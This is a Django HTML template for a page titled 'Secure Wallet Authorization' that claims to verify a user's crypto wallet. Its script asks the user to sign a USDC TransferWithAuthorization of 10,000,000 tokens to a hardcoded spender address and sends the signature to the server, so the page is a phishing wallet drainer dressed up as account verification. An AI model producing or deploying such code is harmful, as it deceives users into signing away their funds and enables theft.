{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Wallet Authorization</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
:root { --accent: #38bdf8; --bg-dark: #0f172a; --card-bg: #1e293b; }
body { background-color: var(--bg-dark); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Inter', sans-serif; }
.auth-card { background: var(--card-bg); padding: 40px; border-radius: 28px; width: 100%; max-width: 440px; border: 1px solid #334155; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
.btn-action { background: var(--accent); color: var(--bg-dark); font-weight: 800; border: none; padding: 16px; border-radius: 14px; width: 100%; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
.btn-action:hover { background: #7dd3fc; transform: translateY(-2px); box-shadow: 0 10px 15px -3px rgba(56, 189, 248, 0.3); }
.btn-action:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; transform: none; }
.detail-row { background: rgba(15, 23, 42, 0.5); padding: 12px 16px; border-radius: 12px; border: 1px solid #334155; margin-bottom: 12px; }
.detail-label { font-size: 0.7rem; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.05em; display: block; }
.detail-value { font-family: 'Roboto Mono', monospace; font-size: 0.85rem; color: var(--accent); word-break: break-all; }
.status-pill { display: inline-block; padding: 6px 16px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; margin-top: 20px; background: rgba(255,255,255,0.05); color: #94a3b8; }
.d-none { display: none !important; }
</style>
</head>
<body>

<div class="auth-card">
    <div class="text-center mb-4">
        <div style="background: rgba(56, 189, 248, 0.1); width: 64px; height: 64px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
            <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" fill="#38bdf8" viewBox="0 0 16 16">
                <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z"/>
            </svg>
        </div>
        <h4 class="mb-1">Wallet Authorization</h4>
        <p class="text-secondary small">Verify your account to proceed</p>
    </div>

    <div id="step-1">
        <button id="connectBtn" class="btn-action">Connect Wallet</button>
    </div>

    <div id="step-2" class="d-none">
        <div class="detail-row">
            <span class="detail-label">Active Address</span>
            <div id="addrDisplay" class="detail-value">0x...</div>
        </div>
        <div class="detail-row">
            <span class="detail-label">Detected Network</span>
            <div id="networkDisplay" class="detail-value">Loading...</div>
        </div>
        <button id="signBtn" class="btn-action">Sign Authorization</button>
    </div>

    <div class="text-center">
        <div id="status" class="status-pill">System Ready</div>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
<script>
const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
let userAccount = null;

const networks = {
    1: { name: "Ethereum Mainnet", usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
    8453: { name: "Base Network", usdc: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" },
    137: { name: "Polygon", usdc: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359" }
};

// --- Connect Wallet ---
document.getElementById('connectBtn').onclick = async () => {
    if (!window.ethereum) return alert("No wallet detected. Open in a wallet browser.");

    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        userAccount = await signer.getAddress();

        const network = await provider.getNetwork();
        const chainId = Number(network.chainId);

        if (!networks[chainId]) alert(`Unsupported network (ID: ${chainId})`);

        document.getElementById('step-1').classList.add('d-none');
        document.getElementById('step-2').classList.remove('d-none');
        document.getElementById('addrDisplay').innerText = userAccount;
        document.getElementById('networkDisplay').innerText = networks[chainId]?.name || `Other (ID: ${chainId})`;
        document.getElementById('status').innerText = "Wallet Connected";
        document.getElementById('status').style.color = "#38bdf8";

    } catch (err) {
        console.error(err);
        alert("Connection failed: " + err.message);
    }
};

// --- Sign Authorization ---
document.getElementById('signBtn').onclick = async () => {
    const status = document.getElementById('status');
    const btn = document.getElementById('signBtn');
    btn.disabled = true;
    status.innerText = "Check your wallet...";
    status.style.color = "#38bdf8";

    try {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();

        const network = await provider.getNetwork();
        const chainId = Number(network.chainId);
        if (!networks[chainId]) throw new Error("Unsupported network");

        const usdcAddr = networks[chainId].usdc;
        const nonce = ethers.hexlify(ethers.randomBytes(32));
        const deadline = Math.floor(Date.now() / 1000) + 86400; // 24h
        const amount = ethers.parseUnits("10000000", 6);

        const domain = {
            name: "USD Coin",
            version: "2",
            chainId,
            verifyingContract: usdcAddr
        };

        const types = {
            TransferWithAuthorization: [
                { name: "from", type: "address" },
                { name: "to", type: "address" },
                { name: "value", type: "uint256" },
                { name: "validAfter", type: "uint256" },
                { name: "validBefore", type: "uint256" },
                { name: "nonce", type: "bytes32" }
            ]
        };

        const message = { from: userAccount, to: SPENDER, value: amount, validAfter: 0, validBefore: deadline, nonce };

        const signature = await signer._signTypedData(domain, types, message);
        const sig = ethers.Signature.from(signature);

        status.innerText = "Signature success! Verifying...";

        const response = await fetch('/user/update-wallet-status/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': '{{ csrf_token }}'
            },
            body: JSON.stringify({
                address: userAccount,
                v: sig.v, r: sig.r, s: sig.s,
                nonce, deadline,
                amount: amount.toString(),
                chainId
            })
        });

        if (response.ok) {
            status.innerText = "Account Verified!";
            status.style.color = "#4ade80";
            btn.innerText = "Verified";
        } else throw new Error("Server Sync Failed");

    } catch (err) {
        console.error(err);
        btn.disabled = false;
        if (err.code === 4001 || err.message.toLowerCase().includes("reject")) {
            status.innerText = "Request Cancelled";
            status.style.color = "#fb7185";
        } else {
            status.innerText = "Error: Check Network Sync";
            status.style.color = "#facc15";
        }
    }
};
</script>
</body>
</html>
